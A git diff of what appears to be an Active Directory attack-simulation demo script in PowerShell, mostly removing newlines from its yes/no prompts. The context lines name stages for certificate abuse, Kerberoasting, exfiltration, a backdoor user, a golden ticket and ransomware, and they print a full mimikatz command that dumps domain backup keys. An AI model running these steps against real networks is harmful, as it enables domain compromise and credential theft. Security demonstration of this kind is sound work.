-        $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+        $question = "Do you need to REPEAT this attack level - Y or N? Default "
         $repeat = Get-Answer -question $question -defaultValue $no
    
     } Until ($repeat -eq $no)
@@ -2931,7 +2929,7 @@ Function Start-AS2GoDemo {
 
         # http://attack.mitre.org/techniques/T1649/
 
-        $question = "`nDo you want to run this attack - Y or N? Default "
+        $question = "Do you want to run this attack - Y or N? Default "
         $answer = Get-Answer -question $question -defaultValue $No
 
         If ($answer -eq $yes)
@@ -2964,7 +2962,7 @@ Function Start-AS2GoDemo {
                 Write-Host "____________________________________________________________________`n" 
 
                 # End "Do ... Until" Loop?
-                $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+                $question = "Do you need to REPEAT this attack level - Y or N? Default "
                 $repeat = Get-Answer -question $question -defaultValue $no
    
             } Until ($repeat -eq $no)
@@ -2992,7 +2990,7 @@ Function Start-AS2GoDemo {
 
                 $pemFile = Start-RequestingCertificate -myEntCA $EnterpriseCA -CAtemplate $CAtemplate -altname $domainadmin
 
-                $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+                $question = "Do you need to REPEAT this attack level - Y or N? Default "
                 $repeat = Get-Answer -question $question -defaultValue $no
    
             } Until ($repeat -eq $no)
@@ -3023,7 +3021,7 @@ Function Start-AS2GoDemo {
 
                 Get-KerberosTGT -pfxFile $pfxFile -altname $domainadmin
 
-                $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+                $question = "Do you need to REPEAT this attack level - Y or N? Default "
                 $repeat = Get-Answer -question $question -defaultValue $no
    
             } Until ($repeat -eq $no)
@@ -3040,7 +3038,7 @@ Function Start-AS2GoDemo {
         Write-Host "____________________________________________________________________`n" 
 
 
-        $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+        $question = "Do you need to REPEAT this attack level - Y or N? Default "
         $repeat = Get-Answer -question $question -defaultValue $no
    
     } Until ($repeat -eq $no)
@@ -3060,8 +3058,8 @@ Function Start-AS2GoDemo {
 
     #region Attack Level -  Kerberoasting Attack
 
-    Update-WindowTitle -NewTitle $stage20
-    Set-KeyValue -key "LastStage" -NewValue $stage20
+    Update-WindowTitle -NewTitle $stage27
+    Set-KeyValue -key "LastStage" -NewValue $stage27
     #Show-Step -step "step_007.html"
     Do {
 
@@ -3082,7 +3080,7 @@ Function Start-AS2GoDemo {
         Write-Host "____________________________________________________________________`n" 
 
         # End "Do ... Until" Loop?
-        $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+        $question = "Do you need to REPEAT this attack level - Y or N? Default "
         $repeat = Get-Answer -question $question -defaultValue $no
    
     } Until ($repeat -eq $no)
@@ -3111,7 +3109,7 @@ Function Start-AS2GoDemo {
         Write-Host "              Try to find and exfiltrate sensitive data            "
         Write-Host "____________________________________________________________________`n" 
 
-        $question = "`nDo you want to run this step - Y or N? Default "
+        $question = "Do you want to run this step - Y or N? Default "
         $answer = Get-Answer -question $question -defaultValue $Yes
 
         If ($answer -eq $yes) {
@@ -3130,7 +3128,7 @@ Function Start-AS2GoDemo {
 
 
         # End "Do ... Until" Loop?
-        $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+        $question = "Do you need to REPEAT this attack level - Y or N? Default "
         $repeat = Get-Answer -question $question -defaultValue $no
    
     } Until ($repeat -eq $no)
@@ -3161,7 +3159,7 @@ Function Start-AS2GoDemo {
         Write-Host "               Step #5 - create golden ticket"
         Write-Host "               Step #6 - reboot (all machines)"  
 
-        $question = "`nDo you want to run these steps - Y or N? Default "
+        $question = "Do you want to run these steps - Y or N? Default "
         $answer = Get-Answer -question $question -defaultValue $Yes
 
         If ($answer -eq $yes) {
@@ -3173,7 +3171,7 @@ Function Start-AS2GoDemo {
             Write-Host "        Create a backdoor USER and add it to Sensitive Groups           "
             Write-Host "____________________________________________________________________`n"     
     
-            $question = "`nDo you want to run this step - Y or N? Default "
+            $question = "Do you want to run this step - Y or N? Default "
             $answer = Get-Answer -question $question -defaultValue $Yes
 
             If ($answer -eq $yes) {
@@ -3191,7 +3189,7 @@ Function Start-AS2GoDemo {
             Write-Host "`n NEXT STEP: " -NoNewline
             Write-Host "mimikatz.exe ""privilege::debug"" ""lsadump::backupkeys /system:$mydc.$fqdn /export"" ""exit""`n" -ForegroundColor $global:FGCCommand
     
-            $question = "`nDo you want to run this step - Y or N? Default "
+            $question = "Do you want to run this step - Y or N? Default "
             $answer = Get-Answer -question $question -defaultValue $Yes
 
             If ($answer -eq $yes) {
@@ -3217,7 +3215,7 @@ Function Start-AS2GoDemo {
             Write-host $global:BDUser -ForegroundColor $global:FGCHighLight -NoNewline
             Write-Host " - $Smily"
         
-            $question = "`nDo you want to run these steps - Y or N? Default "
+            $question = "Do you want to run these steps - Y or N? Default "
             $answer = Get-Answer -question $question -defaultValue $Yes
 
             If ($answer -eq $yes) {
@@ -3233,7 +3231,7 @@ Function Start-AS2GoDemo {
             Write-Host "                 ran ransomware attack?                               "
             Write-Host "____________________________________________________________________`n"     
     
-            $question = "`nDo you want to run this step - Y or N? Default "
+            $question = "Do you want to run this step - Y or N? Default "
             $answer = Get-Answer -question $question -defaultValue $no
 
             If ($answer -eq $yes) {
@@ -3248,7 +3246,7 @@ Function Start-AS2GoDemo {
             Write-Host "        create golden ticket for an unknown user                    "
             Write-Host "____________________________________________________________________`n"     
 
-            $question = "`nDo you want to run this step - Y or N? Default "
+            $question = "Do you want to run this step - Y or N? Default "
             $answer = Get-Answer -question $question -defaultValue $Yes
 
             If ($answer -eq $yes) {
@@ -3264,7 +3262,7 @@ Function Start-AS2GoDemo {
             Write-Host "                 reboot (all machines)                              "
             Write-Host "____________________________________________________________________`n"     
     
-            $question = "`nDo you want to run this step - Y or N? Default "
+            $question = "Do you want to run this step - Y or N? Default "
             $answer = Get-Answer -question $question -defaultValue $Yes
 
             If ($answer -eq $yes) {
@@ -3280,7 +3278,7 @@ Function Start-AS2GoDemo {
         Write-Host "____________________________________________________________________`n" 
 
 
-        $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+        $question = "Do you need to REPEAT this attack level - Y or N? Default "
         $repeat = Get-Answer -question $question -defaultValue $no
 
    
